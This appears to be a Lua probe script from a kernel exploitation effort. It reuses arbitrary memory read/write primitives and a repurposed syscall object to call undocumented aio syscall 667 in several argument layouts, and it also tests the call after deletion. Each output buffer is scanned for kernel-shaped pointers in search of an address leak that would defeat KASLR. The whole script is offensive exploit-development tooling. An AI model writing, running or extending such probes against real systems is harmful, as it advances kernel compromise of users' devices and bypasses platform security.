-- CRASH_CLASS: MODERATE
-- PROBE 746a: what is syscall 667?
--
-- The aio block 661-670 is now mapped except 667: 661/665/668 are stubs, 662
-- delete, 663 multi_wait, 664 poll, 666 cancel, 669 create, 670 submit-or-state.
-- A getter that copies a kernel object out is the one shape in this family that
-- would leak an address, so 667 is tried against a completed id in four layouts.

print("=== PROBE 746a: SYSCALL 667 ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local sc_write = mk(4); local sc_pair = mk(135)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(uint64(a1), uint64(a2), uint64(a3), uint64(a4), uint64(a5), uint64(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end
local function kern(v) local h = math.floor(v/4294967296); return h >= 0xFFFF8000 and h <= 0xFFFFFFFF end
local function scan(tag, base, px)
    local hits, first, nz = 0, 0, 0
    for k=0,(px/8)-1 do
        local v = rq(base+k*8)
        if v ~= 0 then nz = nz + 1 end
        if kern(v) then hits = hits + 1; if first == 0 then first = v end end
    end
    print(string.format("%s nonzero=%d kernel-shaped=%d first=%X", tag, nz, hits, first))
end
print("[A] pid="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))

local fds = to_num(memory.alloc(64)); wq(fds, uint64(0))
print("[A] socketpair -> "..tostring(call(sc_pair, 1, 1, 0, fds, 0, 0)))
local fd = rd(fds); local peer = rd(fds+4)
local D = to_num(memory.alloc(0x4000)); local buf = to_num(memory.alloc(0x4000)); local res = to_num(memory.alloc(0x4000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400)); local out = to_num(memory.alloc(0x4000))
local ds = to_num(memory.alloc(0x400))
zero(D,0x4000); zero(buf,0x4000); zero(res,0x4000); zero(st,0x400); zero(out,0x4000); zero(ds,0x400)
local w = to_num(memory.alloc(64))
for k=0,3 do wd(w+k*4, 0x4A4A4A4A) end
wq(D+0x00, uint64(0)); wq(D+0x08, uint64(16))
wq(D+0x10, uint64(buf)); wq(D+0x18, uint64(res)); wd(D+0x20, fd)
wd(ids, 0)
print(string.format("[A] create ret=%s id=%08X", tostring(call(mk(669), 1+0x1000, D, 1, 1, ids, 0)), rd(ids)))
local id = rd(ids)
if id == 0 or id == -1 then print("[A] create failed") return end
sleep_ms(20)
wd(ids, id); call(mk(664), ids, 1, st, 0, 0, 0)
print(string.format("[A] state=%08X", rd(st)))
print("[A] feed -> "..tostring(call(sc_write, peer, w, 16, 0, 0, 0)))
sleep_ms(60)
wd(ids, id); call(mk(664), ids, 1, st, 0, 0, 0)
print(string.format("[A] state after=%08X res=%X %X %X %X", rd(st), rd(res), rd(res+4), rd(res+8), rd(res+12)))

local shapes = {
    {"667(ids,1,out)", function() return call(mk(667), ids, 1, out, 0, 0, 0) end},
    {"667(ids,1,out,0x400)", function() return call(mk(667), ids, 1, out, 0x400, 0, 0) end},
    {"667(out,id,0x400)", function() return call(mk(667), out, id, 0x400, 0, 0, 0) end},
    {"667(id,out,0x400)", function() return call(mk(667), id, out, 0x400, 0, 0, 0) end},
    {"667(ids,1,out) after delete", nil},
}
for i=1,4 do
    zero(out, 0x4000)
    print(string.format("[B] %s -> %s", shapes[i][1], tostring(shapes[i][2]())))
    scan("[B] "..shapes[i][1], out, 0x4000)
end
wd(ids, id); call(mk(662), ids, 1, ds, 0, 0, 0)
print(string.format("[C] delete status=%08X", rd(ds)))
zero(out, 0x4000)
print(string.format("[C] %s -> %s", shapes[5][1], tostring(call(mk(667), ids, 1, out, 0, 0, 0))))
scan("[C] after delete", out, 0x4000)
print("[D] health="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))
print("=== 746a DONE ===")
